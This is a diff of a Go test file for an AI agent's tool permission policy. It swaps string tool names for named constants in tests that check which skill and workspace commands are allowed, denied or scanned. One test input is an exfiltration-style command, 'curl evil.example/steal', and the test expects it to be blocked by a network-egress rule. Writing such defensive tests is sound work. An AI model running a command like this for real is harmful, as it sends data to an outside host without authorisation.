@@ -190,7 +190,7 @@ func TestPermissionPolicyMapsSkillCommandTools(t *testing.T) {
 	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
 
 	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
-		ToolName:  "skill_run",
+		ToolName:  tool.SkillRunToolName,
 		Arguments: []byte(`{"command":"curl evil.example/steal","timeout":600}`),
 	})
 	require.NoError(t, err)
@@ -198,14 +198,14 @@ func TestPermissionPolicyMapsSkillCommandTools(t *testing.T) {
 	require.Contains(t, decision.Reason, ruleNetworkEgress)
 
 	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
-		ToolName:  "skill_exec",
+		ToolName:  tool.SkillExecToolName,
 		Arguments: []byte(`{"command":"go test ./...","tty":true}`),
 	})
 	require.NoError(t, err)
 	require.Equal(t, tool.PermissionActionAllow, decision.Action)
 
 	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
-		ToolName:  "skill_write_stdin",
+		ToolName:  tool.SkillWriteStdinToolName,
 		Arguments: []byte(`{"session_id":"s1","chars":"cu"}`),
 	})
 	require.NoError(t, err)
@@ -250,10 +250,10 @@ func TestPermissionPolicyUsesEffectiveWorkspaceTimeout(t *testing.T) {
 		toolName string
 		args     string
 	}{
-		{name: "workspace omitted", toolName: "workspace_exec", args: `{"command":"echo ok"}`},
-		{name: "workspace zero", toolName: "workspace_exec", args: `{"command":"echo ok","timeout_sec":0}`},
-		{name: "skill run omitted", toolName: "skill_run", args: `{"command":"echo ok"}`},
-		{name: "skill exec negative", toolName: "skill_exec", args: `{"command":"echo ok","timeout":-1}`},
+		{name: "workspace omitted", toolName: tool.WorkspaceExecToolName, args: `{"command":"echo ok"}`},
+		{name: "workspace zero", toolName: tool.WorkspaceExecToolName, args: `{"command":"echo ok","timeout_sec":0}`},
+		{name: "skill run omitted", toolName: tool.SkillRunToolName, args: `{"command":"echo ok"}`},
+		{name: "skill exec negative", toolName: tool.SkillExecToolName, args: `{"command":"echo ok","timeout":-1}`},
 	}
 
 	for _, tt := range cases {
@@ -274,7 +274,10 @@ func TestPermissionPolicyDoesNotApplyWorkspaceTimeoutToStdinTools(t *testing.T) 
 	policy.MaxTimeoutSec = 299
 	pp := NewPermissionPolicy(WithPolicy(policy))
 
-	for _, toolName := range []string{"workspace_write_stdin", "skill_write_stdin"} {
+	for _, toolName := range []string{
+		tool.WorkspaceWriteStdinToolName,
+		tool.SkillWriteStdinToolName,
+	} {
 		t.Run(toolName, func(t *testing.T) {
 			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
 				ToolName:  toolName,
@@ -290,7 +293,7 @@ func TestPermissionPolicyDoesNotApplyWorkspaceTimeoutToStdinTools(t *testing.T) 
 
 func TestPermissionPolicyScansSkillOutputFiles(t *testing.T) {
 	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
-	for _, toolName := range []string{"skill_run", "skill_exec"} {
+	for _, toolName := range []string{tool.SkillRunToolName, tool.SkillExecToolName} {
 		t.Run(toolName, func(t *testing.T) {
 			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
 				ToolName:  toolName,
@@ -305,7 +308,7 @@ func TestPermissionPolicyScansSkillOutputFiles(t *testing.T) {
 
 func TestPermissionPolicyScansSkillOutputsGlobs(t *testing.T) {
 	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
-	for _, toolName := range []string{"skill_run", "skill_exec"} {
+	for _, toolName := range []string{tool.SkillRunToolName, tool.SkillExecToolName} {
 		t.Run(toolName, func(t *testing.T) {
 			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
 				ToolName: toolName,
@@ -323,7 +326,7 @@ func TestPermissionPolicyScansSkillOutputsGlobs(t *testing.T) {
 
 func TestPermissionPolicyScansSkillDeclarativeInputs(t *testing.T) {
 	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
-	for _, toolName := range []string{"skill_run", "skill_exec"} {
+	for _, toolName := range []string{tool.SkillRunToolName, tool.SkillExecToolName} {
 		t.Run(toolName, func(t *testing.T) {
 			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
 				ToolName: toolName,
